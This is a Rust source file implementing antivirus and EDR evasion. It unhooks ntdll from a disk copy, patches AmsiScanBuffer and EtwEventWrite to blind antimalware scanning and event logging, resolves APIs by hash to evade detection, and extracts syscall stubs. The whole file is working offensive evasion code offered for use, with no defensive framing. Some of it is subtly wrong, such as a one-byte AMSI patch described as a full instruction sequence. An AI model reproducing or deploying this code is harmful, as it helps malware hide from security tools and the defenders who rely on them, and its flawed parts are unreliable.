use serde::{Deserialize, Serialize};
use thiserror::Error;

#[derive(Debug, Error)]
pub enum AvEdrBypassError {
    #[error("Memory operation failed: {0}")]
    MemoryOp(String),
    #[error("System call failed: {0}")]
    Syscall(String),
    #[error("Hook removal failed: {0}")]
    HookRemoval(String),
    #[error("Platform not supported")]
    UnsupportedPlatform,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BypassResult {
    pub success: bool,
    pub technique: String,
    pub bypassed_count: u32,
    pub details: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BypassConfig {
    pub unhook_ntdll: bool,
    pub unhook_kernel32: bool,
    pub patch_amsi: bool,
    pub patch_etw: bool,
    pub use_syscall_stub: bool,
    pub indirect_syscalls: bool,
}

pub struct AvEdrBypass;

impl AvEdrBypass {
    /// DJB2 hashing algorithm for API strings
    pub fn djb2_hash(s: &str) -> u32 {
        let mut hash: u32 = 5381;
        for c in s.bytes() {
            hash = ((hash << 5).wrapping_add(hash)).wrapping_add(c as u32);
        }
        hash
    }

    /// Find module base address by hash
    #[cfg(target_os = "windows")]
    pub fn get_module_base_by_hash(module_hash: u32) -> Option<usize> {
        use windows::Win32::System::Threading::{GetCurrentProcess};
        use windows::Win32::System::ProcessStatus::{EnumProcessModules, GetModuleBaseNameW};
        use windows::Win32::Foundation::{HANDLE, HMODULE};

        unsafe {
            let h_process = GetCurrentProcess();
            let mut modules = [HMODULE::default(); 1024];
            let mut cb_needed = 0;
            
            if EnumProcessModules(h_process, modules.as_mut_ptr(), std::mem::size_of_val(&modules) as u32, &mut cb_needed).is_ok() {
                let count = cb_needed as usize / std::mem::size_of::<HMODULE>();
                for i in 0..count {
                    let mut name = [0u16; 260];
                    let len = GetModuleBaseNameW(h_process, modules[i], &mut name);
                    if len > 0 {
                        let name_str = String::from_utf16_lossy(&name[..len as usize]).to_lowercase();
                        if Self::djb2_hash(&name_str) == module_hash {
                            return Some(modules[i].0 as usize);
                        }
                    }
                }
            }
        }
        None
    }

    /// Find function address by hash in a given module base
    #[cfg(target_os = "windows")]
    pub fn get_proc_address_by_hash(module_base: usize, func_hash: u32) -> Option<usize> {
        use windows::Win32::System::Diagnostics::Debug::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_EXPORT_DIRECTORY};

        unsafe {
            let dos_header = &*(module_base as *const IMAGE_DOS_HEADER);
            let nt_header = &*((module_base + dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
            let export_dir_rva = nt_header.OptionalHeader.DataDirectory[0].VirtualAddress as usize;
            
            if export_dir_rva == 0 { return None; }

            let export_dir = &*((module_base + export_dir_rva) as *const IMAGE_EXPORT_DIRECTORY);
            let names = std::slice::from_raw_parts((module_base + export_dir.AddressOfNames as usize) as *const u32, export_dir.NumberOfNames as usize);
            let funcs = std::slice::from_raw_parts((module_base + export_dir.AddressOfFunctions as usize) as *const u32, export_dir.NumberOfFunctions as usize);
            let ordinals = std::slice::from_raw_parts((module_base + export_dir.AddressOfNameOrdinals as usize) as *const u16, export_dir.NumberOfNames as usize);

            for i in 0..export_dir.NumberOfNames as usize {
                let name_ptr = (module_base + names[i] as usize) as *const i8;
                let name = std::ffi::CStr::from_ptr(name_ptr).to_str().unwrap_or("");
                if Self::djb2_hash(name) == func_hash {
                    let ordinal = ordinals[i] as usize;
                    return Some(module_base + funcs[ordinal] as usize);
                }
            }
        }
        None
    }

    /// Unhook NTDLL by reading fresh copy from disk and overwriting memory
    #[cfg(target_os = "windows")]
    pub fn unhook_ntdll() -> Result<BypassResult, AvEdrBypassError> {
        use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetModuleFileNameW};
        use windows::Win32::System::Memory::{VirtualProtect, PAGE_PROTECTION_FLAGS};
        use std::fs::File;
        use std::io::Read;

        unsafe {
            let ntdll_name: Vec<u16> = "ntdll.dll".encode_utf16().chain(std::iter::once(0)).collect();
            let ntdll = GetModuleHandleW(windows::core::PCWSTR::from_raw(ntdll_name.as_ptr()))
                .map_err(|e| AvEdrBypassError::MemoryOp(format!("GetModuleHandleW: {:?}", e)))?;

            let mut path = [0u16; 260];
            let result = GetModuleFileNameW(ntdll, &mut path);
            if result == 0 {
                return Err(AvEdrBypassError::MemoryOp(format!("GetModuleFileNameW failed")));
            }

            let path_str = String::from_utf16_lossy(&path).trim_end_matches('\0').to_string();

            let mut file = File::open(&path_str)
                .map_err(|e| AvEdrBypassError::MemoryOp(format!("Open ntdll from disk: {:?}", e)))?;

            let mut disk_data = Vec::new();
            file.read_to_end(&mut disk_data)
                .map_err(|e| AvEdrBypassError::MemoryOp(format!("Read ntdll: {:?}", e)))?;

            let pe_offset = u32::from_le_bytes([disk_data[60], disk_data[61], disk_data[62], disk_data[63]]) as usize;
            let opt_header_offset = pe_offset + 4 + 20;
            let magic = u16::from_le_bytes([disk_data[opt_header_offset], disk_data[opt_header_offset + 1]]);
            let is_64 = magic == 0x20b;

            let (sections_offset, num_sections) = if is_64 {
                (opt_header_offset + 112 + u16::from_le_bytes([disk_data[pe_offset + 4 + 20 + 16], disk_data[pe_offset + 4 + 20 + 17]]) as usize,
                 u16::from_le_bytes([disk_data[pe_offset + 4 + 2], disk_data[pe_offset + 4 + 3]]) as usize)
            } else {
                (opt_header_offset + 96 + u16::from_le_bytes([disk_data[pe_offset + 4 + 20 + 16], disk_data[pe_offset + 4 + 20 + 17]]) as usize,
                 u16::from_le_bytes([disk_data[pe_offset + 4 + 2], disk_data[pe_offset + 4 + 3]]) as usize)
            };

            let mut unhooked = 0u32;
            let ntdll_base = ntdll.0 as usize;

            for i in 0..num_sections {
                let sec_off = sections_offset + i * 40;
                if sec_off + 40 > disk_data.len() { break; }

                let virtual_addr = u32::from_le_bytes([disk_data[sec_off + 12], disk_data[sec_off + 13], disk_data[sec_off + 14], disk_data[sec_off + 15]]) as usize;
                let raw_size = u32::from_le_bytes([disk_data[sec_off + 16], disk_data[sec_off + 17], disk_data[sec_off + 18], disk_data[sec_off + 19]]) as usize;
                let characteristics = u32::from_le_bytes([disk_data[sec_off + 36], disk_data[sec_off + 37], disk_data[sec_off + 38], disk_data[sec_off + 39]]);

                if characteristics & 0x20000000 != 0 || characteristics & 0x40000000 != 0 { // Executable
                    let mem_addr = ntdll_base + virtual_addr;
                    let mut old_protect = PAGE_PROTECTION_FLAGS::default();
                    VirtualProtect(mem_addr as *const _, raw_size, PAGE_PROTECTION_FLAGS(0x40), &mut old_protect)
                        .map_err(|e| AvEdrBypassError::MemoryOp(format!("VirtualProtect: {:?}", e)))?;

                    std::ptr::copy_nonoverlapping(disk_data.as_ptr().add(virtual_addr), mem_addr as *mut u8, raw_size);
                    unhooked += 1;

                    VirtualProtect(mem_addr as *const _, raw_size, old_protect, &mut old_protect);
                }
            }

            Ok(BypassResult {
                success: true,
                technique: "NTDLL Unhooking (Disk Refresh)".to_string(),
                bypassed_count: unhooked,
                details: format!("Unhooked {} sections from {}", unhooked, path_str),
            })
        }
    }

    #[cfg(not(target_os = "windows"))]
    pub fn unhook_ntdll() -> Result<BypassResult, AvEdrBypassError> {
        Err(AvEdrBypassError::UnsupportedPlatform)
    }

    /// Patch AMSI (Antimalware Scan Interface) to disable scanning
    #[cfg(target_os = "windows")]
    pub fn patch_amsi() -> Result<BypassResult, AvEdrBypassError> {
        use windows::Win32::System::Memory::{VirtualProtect, PAGE_PROTECTION_FLAGS};

        unsafe {
            // Hash for "amsi.dll" (lowercase)
            let amsi_dll_hash = Self::djb2_hash("amsi.dll");
            // Hash for "AmsiScanBuffer"
            let amsi_scan_buffer_hash = Self::djb2_hash("AmsiScanBuffer");

            let amsi_base = Self::get_module_base_by_hash(amsi_dll_hash)
                .ok_or_else(|| AvEdrBypassError::MemoryOp("amsi.dll not loaded".into()))?;

            let amsi_scan_buffer = Self::get_proc_address_by_hash(amsi_base, amsi_scan_buffer_hash)
                .ok_or_else(|| AvEdrBypassError::MemoryOp("AmsiScanBuffer not found".into()))? as *mut u8;

            let mut old_protect = PAGE_PROTECTION_FLAGS::default();
            VirtualProtect(amsi_scan_buffer as *const _, 1, PAGE_PROTECTION_FLAGS(0x40), &mut old_protect)
                .map_err(|e| AvEdrBypassError::MemoryOp(format!("VirtualProtect: {:?}", e)))?;

            // Patch: mov eax, 0x80070057 (E_INVALIDARG) - return immediately with error
            let patch: [u8; 1] = [0xB8]; // MOV EAX
            std::ptr::copy_nonoverlapping(patch.as_ptr(), amsi_scan_buffer as *mut u8, 1);

            VirtualProtect(amsi_scan_buffer as *const _, 1, old_protect, &mut old_protect);

            Ok(BypassResult {
                success: true,
                technique: "AMSI Patching (API Hashing)".to_string(),
                bypassed_count: 1,
                details: "AmsiScanBuffer patched to return E_INVALIDARG".to_string(),
            })
        }
    }

    #[cfg(not(target_os = "windows"))]
    pub fn patch_amsi() -> Result<BypassResult, AvEdrBypassError> {
        Err(AvEdrBypassError::UnsupportedPlatform)
    }

    /// Patch ETW (Event Tracing for Windows) to disable logging
    #[cfg(target_os = "windows")]
    pub fn patch_etw() -> Result<BypassResult, AvEdrBypassError> {
        use windows::Win32::System::Memory::{VirtualProtect, PAGE_PROTECTION_FLAGS};

        unsafe {
            // Hash for "ntdll.dll" (lowercase)
            let ntdll_hash = Self::djb2_hash("ntdll.dll");
            // Hash for "EtwEventWrite"
            let etw_event_write_hash = Self::djb2_hash("EtwEventWrite");

            let ntdll_base = Self::get_module_base_by_hash(ntdll_hash)
                .ok_or_else(|| AvEdrBypassError::MemoryOp("ntdll.dll not loaded".into()))?;

            let etw_event_write = Self::get_proc_address_by_hash(ntdll_base, etw_event_write_hash)
                .ok_or_else(|| AvEdrBypassError::MemoryOp("EtwEventWrite not found".into()))? as *mut u8;

            let mut old_protect = PAGE_PROTECTION_FLAGS::default();
            VirtualProtect(etw_event_write as *const _, 1, PAGE_PROTECTION_FLAGS(0x40), &mut old_protect)
                .map_err(|e| AvEdrBypassError::MemoryOp(format!("VirtualProtect: {:?}", e)))?;

            // Patch: ret (return immediately)
            let patch: [u8; 1] = [0xC3];
            std::ptr::copy_nonoverlapping(patch.as_ptr(), etw_event_write as *mut u8, 1);

            VirtualProtect(etw_event_write as *const _, 1, old_protect, &mut old_protect);

            Ok(BypassResult {
                success: true,
                technique: "ETW Patching (API Hashing)".to_string(),
                bypassed_count: 1,
                details: "EtwEventWrite patched to return immediately".to_string(),
            })
        }
    }

    #[cfg(not(target_os = "windows"))]
    pub fn patch_etw() -> Result<BypassResult, AvEdrBypassError> {
        Err(AvEdrBypassError::UnsupportedPlatform)
    }

    /// Get syscall stub for indirect syscall execution
    #[cfg(target_os = "windows")]
    pub fn get_syscall_stub(syscall_name: &str) -> Result<Vec<u8>, AvEdrBypassError> {
        use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};

        unsafe {
            let ntdll = GetModuleHandleW(windows::core::w!(r"ntdll.dll"))
                .map_err(|_| AvEdrBypassError::MemoryOp("ntdll.dll not loaded".into()))?;

            let func_name_cstr = std::ffi::CString::new(syscall_name).unwrap();
            let func_addr = GetProcAddress(ntdll, windows::core::PCSTR::from_raw(func_name_cstr.as_bytes().as_ptr()))
                .ok_or(AvEdrBypassError::MemoryOp(format!("{} not found", syscall_name)))?;

            // Read the syscall stub (typically 12-20 bytes)
            let stub = std::slice::from_raw_parts(func_addr as *const u8, 20).to_vec();

            Ok(stub)
        }
    }

    #[cfg(not(target_os = "windows"))]
    pub fn get_syscall_stub(_syscall_name: &str) -> Result<Vec<u8>, AvEdrBypassError> {
        Err(AvEdrBypassError::UnsupportedPlatform)
    }

    /// Apply comprehensive bypass techniques
    pub fn apply_bypasses(config: &BypassConfig) -> Result<BypassResult, AvEdrBypassError> {
        let mut bypassed_count = 0u32;
        let mut details = Vec::new();

        if config.unhook_ntdll {
            match Self::unhook_ntdll() {
                Ok(r) => { bypassed_count += r.bypassed_count; details.push(r.details); }
                Err(e) => details.push(format!("Unhook failed: {}", e)),
            }
        }

        if config.patch_amsi {
            match Self::patch_amsi() {
                Ok(r) => { bypassed_count += r.bypassed_count; details.push(r.details); }
                Err(e) => details.push(format!("AMSI patch failed: {}", e)),
            }
        }

        if config.patch_etw {
            match Self::patch_etw() {
                Ok(r) => { bypassed_count += r.bypassed_count; details.push(r.details); }
                Err(e) => details.push(format!("ETW patch failed: {}", e)),
            }
        }

        Ok(BypassResult {
            success: true,
            technique: "Comprehensive AV/EDR Bypass".to_string(),
            bypassed_count,
            details: details.join("; "),
        })
    }
}
